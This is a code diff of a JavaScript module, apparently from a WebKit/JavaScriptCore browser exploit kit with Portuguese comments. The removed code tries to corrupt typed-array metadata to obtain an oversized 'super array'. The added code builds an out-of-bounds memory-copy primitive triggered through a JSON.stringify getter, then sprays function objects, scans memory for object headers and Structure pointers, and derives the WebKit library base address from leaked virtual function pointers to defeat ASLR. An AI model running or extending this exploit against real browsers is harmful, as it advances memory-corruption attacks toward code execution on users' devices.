@@ -9,146 +9,201 @@ import {
     oob_read_absolute,
     clearOOBEnvironment
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
+import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from './config.mjs'; // Caminho para config.mjs
 
 // ============================================================
 // DEFINIÇÕES DE CONSTANTES E VARIÁVEIS GLOBAIS
 // ============================================================
-const FNAME_MAIN = "ExploitLogic_v10.37";
+const FNAME_MAIN = "ExploitLogic_v10.27_fixed"; // Identificador desta versão
 
-const CORRUPTION_OFFSET_TRIGGER_0x70 = 0x70;
-const CORRUPTION_VALUE_0x70 = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
+const GETTER_PROPERTY_NAME_COPY = "AAAA_GetterForMemoryCopy_v10_27f"; // Nome único para o getter
+const PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD = 0x6C;
+const INTERMEDIATE_PTR_OFFSET_0x68 = 0x68;
+const CORRUPTION_OFFSET_TRIGGER = 0x70;
+const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
+const TARGET_COPY_DEST_OFFSET_IN_OOB = 0x180;
 
-// Área no oob_array_buffer_real onde os metadados de uma view serão corrompidos
-const TARGET_METADATA_AREA_IN_OOB = 0x58; 
-const TARGET_MVECTOR_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
-const TARGET_MLENGTH_OFFSET_IN_OOB = TARGET_METADATA_AREA_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x70
-
-const DESIRED_MVECTOR_VALUE  = AdvancedInt64.Zero;
-const DESIRED_MLENGTH_VALUE  = 0xFFFFFFFF;
-
-// Offset no oob_array_buffer_real onde plantaremos um JSCell FALSO para ler seu SID
-const FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB = 0x400;
-const FAKE_U32_ARRAY_SID_TO_PLANT = 0xABCDEF01; // Um valor distinto
-
-let DISCOVERED_UINT32ARRAY_SID = null; // Para armazenar o SID se conseguirmos vazá-lo
-
+let getter_copy_called_flag_v10_27f = false;
 
 // ============================================================
-// FUNÇÃO PRINCIPAL (v10.37 - Vazar SID Plantado com SuperArray)
+// PRIMITIVA DE CÓPIA DE MEMÓRIA (VALIDADA)
+// ============================================================
+async function readFromOOBOffsetViaCopy(dword_source_offset_to_read_from) {
+    const FNAME_PRIMITIVE = `${FNAME_MAIN}.readFromOOBOffsetViaCopy`;
+    getter_copy_called_flag_v10_27f = false;
+
+    if (!oob_array_buffer_real || !oob_dataview_real) {
+        await triggerOOB_primitive();
+        if (!oob_array_buffer_real) return new AdvancedInt64(0xDEADDEAD, 0xBADBAD);
+    }
+    oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8);
+
+    const value_to_plant_at_0x6c = new AdvancedInt64(dword_source_offset_to_read_from, 0);
+    oob_write_absolute(PLANT_OFFSET_0x6C_FOR_COPY_SRC_DWORD, value_to_plant_at_0x6c, 8);
+
+    const getterObjectForCopy = {
+        get [GETTER_PROPERTY_NAME_COPY]() {
+            getter_copy_called_flag_v10_27f = true;
+            try {
+                const qword_at_0x68 = oob_read_absolute(INTERMEDIATE_PTR_OFFSET_0x68, 8);
+                const effective_read_offset = qword_at_0x68.high();
+                if (effective_read_offset === dword_source_offset_to_read_from) {
+                    if (effective_read_offset >= 0 && effective_read_offset < oob_array_buffer_real.byteLength - 8) {
+                        const data_read = oob_read_absolute(effective_read_offset, 8);
+                        oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, data_read, 8);
+                    } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, AdvancedInt64.Zero, 8); }
+                } else { oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xBAD68BAD, 0xBAD68BAD), 8); }
+            } catch (e_getter) { try {oob_write_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, new AdvancedInt64(0xDEADDEAD,0xBADBAD), 8); } catch(e){} }
+            return "getter_copy_v10_27f_done";
+        }
+    };
+    oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
+    await PAUSE_S3(5);
+    try { JSON.stringify(getterObjectForCopy); } catch (e) { /* Ignora */ }
+    if (!getter_copy_called_flag_v10_27f) { return null; }
+    return oob_read_absolute(TARGET_COPY_DEST_OFFSET_IN_OOB, 8);
+}
+
+// ============================================================
+// FUNÇÃO PRINCIPAL (v10.27 - Foco em Vazar Structure* e VFunc*)
 // ============================================================
 export async function sprayAndInvestigateObjectExposure() {
-    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakPlantedSIDWithSuperArray_v10.37`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Vazar SID Plantado com SuperArray ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = `${FNAME_MAIN}.leakStructureAndVFunc_v10.27f`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Tentativa de Vazar Structure* e Ponteiro de Função Virtual ---`, "test", FNAME_CURRENT_TEST);
 
-    const NUM_SPRAY_VIEWS = 200;
-    const SPRAY_VIEW_ELEMENT_COUNT = 8;
-
-    let sprayedVictimViews = [];
-    let superArray = null;
-    let superArrayIndex = -1;
+    let sprayedObjects = [];
 
     try {
         await triggerOOB_primitive();
         if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
 
-        // 1. Plantar um JSCell FALSO (apenas o SID) em um local conhecido do oob_array_buffer_real
-        logS3(`PASSO 1: Plantando SID FALSO ${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)} em ${toHex(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
-        oob_write_absolute(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET, FAKE_U32_ARRAY_SID_TO_PLANT, 4);
-        // Opcional: Preencher outros campos do JSCell falso se necessário para estabilidade da leitura
-        oob_write_absolute(FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, AdvancedInt64.Zero, 8); // Structure* nulo
-
-        // 2. Heap Spraying: Criar VIEWS sobre o oob_array_buffer_real
-        logS3(`PASSO 2: Pulverizando ${NUM_SPRAY_VIEWS} Uint32Array views sobre oob_array_buffer_real...`, "info", FNAME_CURRENT_TEST);
-        let current_data_offset_for_view = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x800;
-        for (let i = 0; i < NUM_SPRAY_VIEWS; i++) {
-            const view_byte_length = SPRAY_VIEW_ELEMENT_COUNT * 4;
-            if (current_data_offset_for_view + view_byte_length > oob_array_buffer_real.byteLength) break;
-            try {
-                let view = new Uint32Array(oob_array_buffer_real, current_data_offset_for_view, SPRAY_VIEW_ELEMENT_COUNT);
-                view[0] = (0xFACE0000 | i);
-                sprayedVictimViews.push(view);
-                current_data_offset_for_view += view_byte_length + 0x80;
-            } catch (e_spray) { break; }
-        }
-        logS3(`  ${sprayedVictimViews.length} views pulverizadas.`, "info", FNAME_CURRENT_TEST);
-        await PAUSE_S3(300);
-
-        // 3. Corromper bytes em TARGET_METADATA_AREA_IN_OOB (0x58) para m_vector=0, m_length=MAX
-        logS3(`PASSO 3: Corrompendo bytes em ${toHex(TARGET_MVECTOR_OFFSET_IN_OOB)} e ${toHex(TARGET_MLENGTH_OFFSET_IN_OOB)}...`, "info", FNAME_CURRENT_TEST);
-        oob_write_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, DESIRED_MVECTOR_VALUE, 8);
-        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER_0x70, CORRUPTION_VALUE_0x70, 8); // Define m_length e m_mode em 0x58
-        await PAUSE_S3(100);
-
-        const val_mvec = oob_read_absolute(TARGET_MVECTOR_OFFSET_IN_OOB, 8);
-        const val_mlen = oob_read_absolute(TARGET_MLENGTH_OFFSET_IN_OOB, 4);
-        logS3(`  Bytes em ${toHex(TARGET_METADATA_AREA_IN_OOB)}: mvec=${val_mvec.toString(true)}, mlen=${toHex(val_mlen)}`, "info", FNAME_CURRENT_TEST);
-
-        if (!(val_mvec.isZero() && val_mlen === DESIRED_MLENGTH_VALUE)) {
-            logS3("    AVISO: Os bytes em 0x58 não foram corrompidos como esperado para m_vector=0, m_length=MAX.", "warn", FNAME_CURRENT_TEST);
+        // 1. Validar Primitiva de Cópia
+        const VALIDATION_OFFSET = 0x250;
+        const VALIDATION_QWORD = new AdvancedInt64(0x87654321, 0x01FEDCBA);
+        oob_write_absolute(VALIDATION_OFFSET, VALIDATION_QWORD, 8);
+        let copied_validation = await readFromOOBOffsetViaCopy(VALIDATION_OFFSET);
+        if (copied_validation && copied_validation.equals(VALIDATION_QWORD)) {
+            logS3("  PASSO 1: Primitiva de cópia validada.", "good", FNAME_CURRENT_TEST);
         } else {
-            logS3("    Bytes em 0x58 preparados com m_vector=0, m_length=MAX.", "good", FNAME_CURRENT_TEST);
+            logS3(`  PASSO 1: FALHA na validação da primitiva de cópia. Lido: ${copied_validation ? copied_validation.toString(true) : "null"}. Abortando.`, "critical", FNAME_CURRENT_TEST);
+            return;
         }
+        await PAUSE_S3(50);
 
-        // 4. Tentar Identificar o "Super Array" (View)
-        logS3(`PASSO 4: Tentando identificar uma "Super View"...`, "info", FNAME_CURRENT_TEST);
-        const MARKER_VALUE = 0xBEEFBEEF;
-        const MARKER_TEST_OFFSET = 0xE0; 
-        const MARKER_TEST_INDEX = MARKER_TEST_OFFSET / 4;
-
-        let original_value_at_marker = 0;
-        try { original_value_at_marker = oob_read_absolute(MARKER_TEST_OFFSET, 4); } catch(e){}
-        oob_write_absolute(MARKER_TEST_OFFSET, MARKER_VALUE, 4);
-
-        for (let i = 0; i < sprayedVictimViews.length; i++) {
-            try {
-                if (sprayedVictimViews[i][MARKER_TEST_INDEX] === MARKER_VALUE) {
-                    logS3(`    !!!! SUPER ARRAY (VIEW) POTENCIALMENTE ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador dados: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_CURRENT_TEST);
-                    superArray = sprayedVictimViews[i];
-                    superArrayIndex = i;
-                    document.title = `SUPER VIEW[${i}] ATIVA!`;
-                    break; 
-                }
-            } catch (e_access) { /* Ignora */ }
+        // 2. Pulverizar Objetos JS
+        logS3("PASSO 2: Pulverizando objetos JSFunction...", "info", FNAME_CURRENT_TEST);
+        const NUM_SPRAY_OBJS = 300;
+        for (let i = 0; i < NUM_SPRAY_OBJS; i++) {
+            sprayedObjects.push(function () { return 0xABC000 + i; });
         }
-        try {oob_write_absolute(MARKER_TEST_OFFSET, original_value_at_marker, 4); } catch(e){}
+        logS3(`  ${sprayedObjects.length} objetos pulverizados.`, "info", FNAME_CURRENT_TEST);
+        await PAUSE_S3(500);
 
-        if (superArray) {
-            logS3(`    SUPER ARRAY JS: sprayedVictimViews[${superArrayIndex}] identificado!`, "good", FNAME_CURRENT_TEST);
-            logS3(`      superArray.length (JS): ${superArray.length}. Tentando ler SID plantado...`, "info", FNAME_CURRENT_TEST);
+        // 3. Escanear o oob_array_buffer_real
+        const SCAN_START = 0x080;
+        const SCAN_END = Math.min(0x7F00, oob_array_buffer_real.byteLength - 0x20);
+        const SCAN_STEP = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET || 0x8;
 
-            // Usar o superArray para ler o SID que plantamos em FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB
-            const sid_read_target_addr = FAKE_U32_ARRAY_JSCELL_OFFSET_IN_OOB + JSC_OFFSETS.ArrayBufferView.STRUCTURE_ID_OFFSET;
-            if (sid_read_target_addr % 4 === 0) {
-                const sid_index_in_superarray = sid_read_target_addr / 4;
-                if (superArray.length > sid_index_in_superarray) {
-                    const sid_leaked_via_superarray = superArray[sid_index_in_superarray];
-                    logS3(`      LIDO COM SUPERARRAY de oob[${toHex(sid_read_target_addr)}]: ${toHex(sid_leaked_via_superarray)}`, "leak", FNAME_CURRENT_TEST);
-                    if (sid_leaked_via_superarray === FAKE_U32_ARRAY_SID_TO_PLANT) {
-                        logS3(`        !!!! SUCESSO !!!! O SID plantado (${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)}) foi lido corretamente com o SuperArray!`, "vuln", FNAME_CURRENT_TEST);
-                        DISCOVERED_UINT32ARRAY_SID = sid_leaked_via_superarray; // Ou o SID real que você quer descobrir
-                        logS3(`        Considerando ${toHex(DISCOVERED_UINT32ARRAY_SID)} como um StructureID REAL para Uint32Array! (Verifique!)`, "vuln", FNAME_CURRENT_TEST);
-                        document.title = `SID ${toHex(DISCOVERED_UINT32ARRAY_SID)} Vazado!`;
-                    } else {
-                        logS3(`        AVISO: SID lido (${toHex(sid_leaked_via_superarray)}) não corresponde ao plantado (${toHex(FAKE_U32_ARRAY_SID_TO_PLANT)}).`, "warn", FNAME_CURRENT_TEST);
+        logS3(`PASSO 3: Escaneando de ${toHex(SCAN_START)} a ${toHex(SCAN_END)} por JSCells e Structure*...`, "info", FNAME_CURRENT_TEST);
+        
+        let webkitBaseLeaked = null;
+        const structurePtrOffsetFromCell = JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET; 
+        const virtualPutOffsetFromStructure = JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET; // Assegure que este offset está correto no config.mjs para o objeto Structure
+
+        for (let cell_base_offset = SCAN_START; cell_base_offset < SCAN_END; cell_base_offset += SCAN_STEP) {
+            let jscell_header = await readFromOOBOffsetViaCopy(cell_base_offset);
+
+            const isCellHeaderZero = isAdvancedInt64Object(jscell_header) && jscell_header.low() === 0 && jscell_header.high() === 0;
+            const isCellHeaderBadRead = isAdvancedInt64Object(jscell_header) && jscell_header.low() === 0xBADBAD && jscell_header.high() === 0xDEADDEAD;
+            const isCellHeaderBadMagic = isAdvancedInt64Object(jscell_header) && jscell_header.low() === 0xBAD68BAD && jscell_header.high() === 0xBAD68BAD;
+
+            if (jscell_header && !isCellHeaderZero && !isCellHeaderBadRead && !isCellHeaderBadMagic ) {
+                const structure_id_val = jscell_header.low(); 
+
+                if (structure_id_val !== 0 && structure_id_val !== 0xFFFFFFFF && (structure_id_val & 0xFFFF0000) !== 0xCAFE0000) {
+                    let leaked_structure_ptr = await readFromOOBOffsetViaCopy(cell_base_offset + structurePtrOffsetFromCell);
+
+                    const isStructPtrZero = isAdvancedInt64Object(leaked_structure_ptr) && leaked_structure_ptr.low() === 0 && leaked_structure_ptr.high() === 0;
+                    const isStructPtrBadRead = isAdvancedInt64Object(leaked_structure_ptr) && leaked_structure_ptr.low() === 0xBADBAD && leaked_structure_ptr.high() === 0xDEADDEAD;
+
+                    if (leaked_structure_ptr && !isStructPtrZero && !isStructPtrBadRead) {
+                        // Heurística para Structure* (ponteiro de heap, parte alta não nula em 64bit, alinhado)
+                        if (leaked_structure_ptr.high() !== 0 && (leaked_structure_ptr.low() & 0x7) === 0) {
+                            logS3(`  [${toHex(cell_base_offset)}] Potencial JSCell: SID=${toHex(structure_id_val)}, Structure*=${leaked_structure_ptr.toString(true)}`, "leak", FNAME_CURRENT_TEST);
+                            
+                            let structure_obj_offset_in_oob = leaked_structure_ptr.low();
+                            if (leaked_structure_ptr.high() !== 0) { 
+                                // logS3(`    Structure* ${leaked_structure_ptr.toString(true)} parece absoluto. Pulando leitura interna com primitiva OOB.`, "info", FNAME_CURRENT_TEST);
+                                continue; 
+                            }
+                            
+                            // Verifica se o offset da Structure está dentro dos limites para ler seus campos
+                            if (structure_obj_offset_in_oob < SCAN_START || structure_obj_offset_in_oob >= oob_array_buffer_real.byteLength - Math.max(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET || 0, virtualPutOffsetFromStructure || 0) - 8) {
+                                // logS3(`    Structure* offset ${toHex(structure_obj_offset_in_oob)} fora da janela de scan segura para campos internos.`, "info", FNAME_CURRENT_TEST);
+                                continue;
+                            }
+                            
+                            let leaked_vfunc_ptr = await readFromOOBOffsetViaCopy(structure_obj_offset_in_oob + virtualPutOffsetFromStructure);
+                            
+                            const isVFuncPtrZero = isAdvancedInt64Object(leaked_vfunc_ptr) && leaked_vfunc_ptr.low() === 0 && leaked_vfunc_ptr.high() === 0;
+                            const isVFuncPtrBadRead = isAdvancedInt64Object(leaked_vfunc_ptr) && leaked_vfunc_ptr.low() === 0xBADBAD && leaked_vfunc_ptr.high() === 0xDEADDEAD;
+
+                            if (leaked_vfunc_ptr && !isVFuncPtrZero && !isVFuncPtrBadRead) {
+                                // Heurística para ponteiro de código
+                                if (leaked_vfunc_ptr.high() > 0x1000 && leaked_vfunc_ptr.high() < 0x7FFF0000) { // Ajuste esta faixa conforme necessário 
+                                    logS3(`    [${toHex(cell_base_offset)}] SID=${toHex(structure_id_val)}, Structure*=${leaked_structure_ptr.toString(true)} -> VFunc*=${leaked_vfunc_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+
+                                    for (const funcName in WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS) {
+                                        const funcOffsetStr = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS[funcName];
+                                        if (!funcOffsetStr || typeof funcOffsetStr !== 'string') continue;
+                                        try {
+                                            const funcOffsetAdv = new AdvancedInt64(funcOffsetStr);
+                                            const potential_base_addr = leaked_vfunc_ptr.sub(funcOffsetAdv);
+                                            const isAligned = (potential_base_addr.low() & 0xFFF) === 0;
+                                            // Heurística de faixa para base (ajuste se necessário)
+                                            const isBaseHighPartPlausible = potential_base_addr.high() > 0x0 && potential_base_addr.high() < 0x80000;
+
+                                            if (isAligned) { // Logar todas as bases alinhadas
+                                                 logS3(`      - Ptr: ${leaked_vfunc_ptr.toString(true)} - Func: ${funcName} (${funcOffsetAdv.toString(true)}) -> Base: ${potential_base_addr.toString(true)} ${isBaseHighPartPlausible ? "<-- ALINHADO & FAIXA OK" : "<-- ALINHADO (Faixa High?)"}`, "info", FNAME_CURRENT_TEST);
+                                            }
+
+                                            if (isAligned && isBaseHighPartPlausible) {
+                                                logS3(`        !!!! VAZAMENTO DE BASE DO WEBKIT POTENCIAL !!!!`, "vuln", FNAME_CURRENT_TEST);
+                                                logS3(`          Ponteiro VFunc: ${leaked_vfunc_ptr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+                                                logS3(`          Corresponde a '${funcName}' (offset config: ${funcOffsetAdv.toString(true)})`, "vuln", FNAME_CURRENT_TEST);
+                                                logS3(`          Endereço Base Calculado: ${potential_base_addr.toString(true)}`, "vuln", FNAME_CURRENT_TEST);
+                                                document.title = `WebKit Base? ${potential_base_addr.toString(true)}`;
+                                                webkitBaseLeaked = potential_base_addr;
+                                                break; 
+                                            }
+                                        } catch (e_adv64) { /* Ignora */ }
+                                    }
+                                }
+                            }
+                        }
                     }
-                } else {
-                    logS3(`      AVISO: Índice ${toHex(sid_index_in_superarray)} fora do superArray.length aparente (${superArray.length})`, "warn", FNAME_CURRENT_TEST);
                 }
-            } else {
-                logS3(`      AVISO: Endereço de leitura de SID ${toHex(sid_read_target_addr)} não alinhado para acesso Uint32.`, "warn", FNAME_CURRENT_TEST);
             }
+            if (webkitBaseLeaked) break;
+            if (cell_base_offset > SCAN_START && cell_base_offset % (SCAN_STEP * 128) === 0) { 
+                logS3(`    Scan de JSCell em ${toHex(cell_base_offset)}...`, "info", FNAME_CURRENT_TEST);
+                await PAUSE_S3(1); 
+            }
+        }
+
+        if (webkitBaseLeaked) {
+            logS3("VAZAMENTO DE ENDEREÇO BASE DO WEBKIT PARECE BEM-SUCEDIDO!", "good", FNAME_CURRENT_TEST);
         } else {
-            logS3("    Não foi possível identificar a 'superArray' (View) específica via teste de marcador.", "warn", FNAME_CURRENT_TEST);
+            logS3("Não foi possível vazar o endereço base do WebKit automaticamente nesta execução via Structure->VFunc.", "warn", FNAME_CURRENT_TEST);
         }
 
     } catch (e) {
-        logS3(`ERRO CRÍTICO: ${e.message}`, "critical", FNAME_CURRENT_TEST);
+        logS3(`ERRO CRÍTICO em ${FNAME_CURRENT_TEST}: ${e.message}`, "critical", FNAME_CURRENT_TEST);
         if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_CURRENT_TEST);
         document.title = `${FNAME_MAIN} FALHOU!`;
     } finally {
-        sprayedVictimViews = [];
+        sprayedObjects = [];
         clearOOBEnvironment();
         logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
     }
